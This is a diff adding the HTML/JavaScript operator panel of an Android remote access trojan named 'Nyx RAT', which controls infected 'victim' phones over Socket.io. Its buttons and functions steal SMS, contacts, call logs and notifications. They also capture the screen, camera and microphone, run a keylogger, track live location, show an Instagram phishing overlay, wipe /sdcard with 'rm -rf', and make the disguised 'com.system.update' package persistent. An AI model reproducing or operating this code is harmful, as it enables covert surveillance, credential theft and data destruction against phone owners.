@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Nyx RAT - Direct Socket.io</title>
+    <style>
+        body { background: #0a0a0a; color: #0f0; font-family: monospace; margin: 0; padding: 20px; }
+        .container { display: flex; gap: 20px; }
+        .sidebar { width: 260px; background: #111; border-right: 1px solid #0f0; padding: 10px; height: 100vh; overflow-y: auto; }
+        .main { flex: 1; }
+        .client { padding: 8px; margin: 4px 0; background: #1a1a1a; cursor: pointer; border-left: 2px solid #0f0; word-break: break-all; }
+        .client.selected { background: #2a2a2a; border-left-color: #0f0; box-shadow: 0 0 5px #0f0; }
+        .cmd-input { width: 70%; background: #111; border: 1px solid #0f0; color: #0f0; padding: 8px; }
+        button { background: #0a0a0a; border: 1px solid #0f0; color: #0f0; padding: 8px 12px; margin: 4px; cursor: pointer; }
+        button:hover { background: #1a1a1a; }
+        .output { background: #111; border: 1px solid #0f0; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; font-size: 12px; }
+        .tab { display: inline-block; padding: 8px 16px; background: #1a1a1a; cursor: pointer; margin-right: 4px; }
+        .tab.active { background: #2a2a2a; border-bottom: 2px solid #0f0; }
+        .tab-content { display: none; padding: 10px; }
+        .tab-content.active { display: block; }
+        .grid-buttons { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px,1fr)); gap: 8px; margin-bottom: 20px; }
+    </style>
+    <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+<div class="container">
+    <div class="sidebar">
+        <h3>📱 Online Clients</h3>
+        <div id="clients-list"></div>
+        <hr>
+        <div>Server IP: <span id="server-ip"></span></div>
+        <button onclick="copyServerIP()">Copy IP</button>
+    </div>
+    <div class="main">
+        <div>
+            <div class="tab" onclick="switchTab('cmd')">💻 Commands</div>
+            <div class="tab" onclick="switchTab('files')">📁 Files</div>
+            <div class="tab" onclick="switchTab('spy')">🕵️ Spy</div>
+            <div class="tab" onclick="switchTab('media')">🎮 Media</div>
+            <div class="tab" onclick="switchTab('system')">⚙️ System</div>
+        </div>
+
+        <!-- Tab: Commands -->
+        <div id="tab-cmd" class="tab-content active">
+            <input type="text" id="cmd" class="cmd-input" placeholder="shell command..." onkeypress="if(event.key==='Enter') sendCmd()">
+            <button onclick="sendCmd()">Execute</button>
+            <div class="grid-buttons" style="margin-top:10px">
+                <button onclick="sendCmd('ls -la /sdcard')">📂 List /sdcard</button>
+                <button onclick="sendCmd('getprop')">📱 System Info</button>
+                <button onclick="sendCmd('pm list packages')">📦 Installed Apps</button>
+                <button onclick="getSMS()">📨 Get SMS</button>
+                <button onclick="getCallLogs()">📞 Call Logs</button>
+                <button onclick="getContacts()">👥 Contacts</button>
+                <button onclick="sendSMS()">✉️ Send SMS</button>
+                <button onclick="getNotifications()">🔔 Notifications</button>
+                <button onclick="screenshot()">📸 Screenshot</button>
+                <button onclick="startKeylog()">⌨️ Keylog Start</button>
+                <button onclick="stopKeylog()">🛑 Keylog Stop</button>
+                <button onclick="enableAdmin()">👑 Device Admin</button>
+                <button onclick="recordAudio()">🎙️ Record Mic</button>
+            </div>
+            <div class="output" id="output"></div>
+        </div>
+
+        <!-- Tab: Files -->
+        <div id="tab-files" class="tab-content">
+            <input type="text" id="filepath" placeholder="/sdcard/" class="cmd-input">
+            <button onclick="listFiles()">List Files</button>
+            <div id="file-list" class="output" style="height:200px"></div>
+            <input type="text" id="download-path" placeholder="/sdcard/file.txt" class="cmd-input">
+            <button onclick="downloadFile()">Download from Victim</button>
+            <input type="file" id="upload-file" style="display:none" onchange="uploadFile()">
+            <button onclick="document.getElementById('upload-file').click()">Upload to Victim</button>
+            <div id="transfer-status"></div>
+        </div>
+
+        <!-- Tab: Spy -->
+        <div id="tab-spy" class="tab-content">
+            <div class="grid-buttons">
+                <button onclick="startCam()">📷 Front Camera (photo)</button>
+                <button onclick="startMic()">🎤 Microphone (10s)</button>
+                <button onclick="getLiveLocation()">📍 Live Location (every 5s)</button>
+                <button onclick="torchOn()">🔦 Torch ON</button>
+                <button onclick="torchOff()">💡 Torch OFF</button>
+                <button onclick="instagramPhish()">📸 Instagram Phishing</button>
+            </div>
+            <div id="spy-output" class="output" style="height:200px"></div>
+        </div>
+
+        <!-- Tab: Media -->
+        <div id="tab-media" class="tab-content">
+            <input type="text" id="music-url" placeholder="http://example.com/song.mp3" class="cmd-input">
+            <button onclick="playMusic()">🎵 Play Music</button>
+            <button onclick="vibrate()">📳 Vibrate (2s)</button>
+            <input type="text" id="speak-text" placeholder="Text to speak" class="cmd-input">
+            <button onclick="speak()">🗣️ Text To Speech</button>
+            <input type="text" id="wallpaper-url" placeholder="Image URL (base64)" class="cmd-input">
+            <button onclick="changeWallpaper()">🖼️ Change Wallpaper</button>
+            <button onclick="openURL()">🌐 Open URL in Browser</button>
+        </div>
+
+        <!-- Tab: System -->
+        <div id="tab-system" class="tab-content">
+            <div class="grid-buttons">
+                <button onclick="lockDevice()">🔒 Lock Device</button>
+                <button onclick="wipeData()">💣 Wipe /sdcard</button>
+                <button onclick="uninstallSelf()">🗑️ Uninstall Self</button>
+                <button onclick="makePersistent()">♻️ Make Persistent</button>
+            </div>
+            <div id="system-output" class="output"></div>
+        </div>
+    </div>
+</div>
+
+<script>
+    let socket = io();   // connects to same host:port
+    let selectedClient = null;
+
+    // Display server IP for manual client configuration
+    fetch('/')
+        .then(() => {
+            let ip = window.location.hostname;
+            document.getElementById('server-ip').innerText = ip + ':3000';
+        });
+
+    function copyServerIP() {
+        let ip = document.getElementById('server-ip').innerText;
+        navigator.clipboard.writeText(ip);
+        alert('Copied: ' + ip);
+    }
+
+    socket.on('clients_update', (clients) => {
+        const div = document.getElementById('clients-list');
+        div.innerHTML = clients.map(c => 
+            `<div class="client ${selectedClient === c.id ? 'selected' : ''}" onclick="selectClient('${c.id}')">
+                📱 ${c.info?.model || c.id.substring(0,6)}<br>
+                <small>${c.info?.android || ''} | ${c.info?.imei?.substring(0,8)}</small>
+             </div>`
+        ).join('');
+    });
+
+    socket.on('command_result', (data) => {
+        const outDiv = document.getElementById('output');
+        outDiv.innerHTML += `\n[${data.clientId.substring(0,6)}] $ ${data.output}`;
+        outDiv.scrollTop = outDiv.scrollHeight;
+    });
+
+    socket.on('file_received', (data) => {
+        const a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + data.content;
+        a.download = data.name;
+        a.click();
+        document.getElementById('transfer-status').innerHTML = 'Downloaded: ' + data.name;
+    });
+
+    socket.on('logs_result', (data) => {
+        const outDiv = document.getElementById('output');
+        outDiv.innerHTML += `\n[${data.clientId.substring(0,6)}] 📋 ${data.type}:\n${data.content}`;
+    });
+
+    socket.on('screenshot_received', (data) => {
+        const img = document.createElement('img');
+        img.src = 'data:image/png;base64,' + data.image;
+        img.style.maxWidth = '100%';
+        document.getElementById('spy-output').innerHTML = '';
+        document.getElementById('spy-output').appendChild(img);
+    });
+
+    function selectClient(id) {
+        selectedClient = id;
+        // re-render clients to show highlight
+        const clientsDiv = document.getElementById('clients-list');
+        Array.from(clientsDiv.children).forEach(child => {
+            if (child.innerText.includes(id.substring(0,6))) {
+                child.classList.add('selected');
+            } else {
+                child.classList.remove('selected');
+            }
+        });
+    }
+
+    function sendCmd(customCmd) {
+        let cmd = customCmd || document.getElementById('cmd').value;
+        if (!selectedClient) { alert('Select a client first'); return; }
+        socket.emit('cmd', { clientId: selectedClient, cmd: cmd, adminId: socket.id });
+        document.getElementById('output').innerHTML += `\n→ [${selectedClient.substring(0,6)}] $ ${cmd}`;
+    }
+
+    function getSMS() { sendCmd('content query --uri content://sms/inbox'); }
+    function getCallLogs() { if(selectedClient) socket.emit('get_call_logs', { clientId: selectedClient, adminId: socket.id }); else alert('Select client'); }
+    function getContacts() { sendCmd('content query --uri content://contacts/phones'); }
+    function sendSMS() {
+        let num = prompt('Phone number:');
+        let text = prompt('Message:');
+        if(num && text && selectedClient) socket.emit('send_sms', { clientId: selectedClient, number: num, text: text, adminId: socket.id });
+    }
+    function getNotifications() { if(selectedClient) socket.emit('get_notifications', { clientId: selectedClient, adminId: socket.id }); }
+    function screenshot() { sendCmd('screencap -p /sdcard/screen.png && base64 /sdcard/screen.png'); }
+    function startKeylog() { if(selectedClient) socket.emit('keylog_start', { clientId: selectedClient }); }
+    function stopKeylog() { if(selectedClient) socket.emit('keylog_stop', { clientId: selectedClient }); }
+    function enableAdmin() { if(selectedClient) socket.emit('enable_admin', { clientId: selectedClient }); }
+    function recordAudio() { if(selectedClient) socket.emit('record_audio', { clientId: selectedClient }); }
+    function listFiles() {
+        let path = document.getElementById('filepath').value;
+        sendCmd('ls -la ' + path);
+    }
+    function downloadFile() {
+        let path = document.getElementById('download-path').value;
+        if(selectedClient) socket.emit('download_file', { clientId: selectedClient, path: path });
+    }
+    function uploadFile() {
+        let fileInput = document.getElementById('upload-file');
+        let file = fileInput.files[0];
+        if(!file || !selectedClient) return;
+        let reader = new FileReader();
+        reader.onload = function(e) {
+            let b64 = btoa(e.target.result);
+            socket.emit('upload_file', { clientId: selectedClient, path: '/sdcard/' + file.name, content: b64 });
+        };
+        reader.readAsBinaryString(file);
+    }
+    function startCam() { sendCmd('termux-camera-photo -c 0 /sdcard/cam.jpg && base64 /sdcard/cam.jpg'); }
+    function startMic() { sendCmd('termux-microphone-record -d 10 -f /sdcard/audio.aac'); }
+    function getLiveLocation() { setInterval(() => sendCmd('termux-location'), 5000); }
+    function torchOn() { if(selectedClient) socket.emit('torch_on', { clientId: selectedClient }); }
+    function torchOff() { if(selectedClient) socket.emit('torch_off', { clientId: selectedClient }); }
+    function instagramPhish() { if(selectedClient) socket.emit('show_instagram_phish', { clientId: selectedClient }); }
+    function playMusic() {
+        let url = document.getElementById('music-url').value;
+        if(url && selectedClient) socket.emit('play_music', { clientId: selectedClient, url: url });
+    }
+    function vibrate() { if(selectedClient) socket.emit('vibrate', { clientId: selectedClient, duration: '2000' }); }
+    function speak() {
+        let text = document.getElementById('speak-text').value;
+        if(text && selectedClient) socket.emit('speak', { clientId: selectedClient, text: text });
+    }
+    function changeWallpaper() {
+        let url = document.getElementById('wallpaper-url').value;
+        if(url && selectedClient) socket.emit('wallpaper', { clientId: selectedClient, image: url });
+    }
+    function openURL() {
+        let url = prompt('Enter URL (http://...)');
+        if(url && selectedClient) socket.emit('open_url', { clientId: selectedClient, url: url });
+    }
+    function lockDevice() { sendCmd('input keyevent KEYCODE_POWER'); }
+    function wipeData() { if(confirm('Wipe entire /sdcard?')) sendCmd('rm -rf /sdcard/*'); }
+    function uninstallSelf() { sendCmd('pm uninstall com.system.update'); }
+    function makePersistent() { sendCmd('mv /data/app/com.system.update* /system/priv-app/'); }
+
+    function switchTab(tab) {
+        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+        document.getElementById(`tab-${tab}`).classList.add('active');
+    }
+</script>
+</body>
+</html>
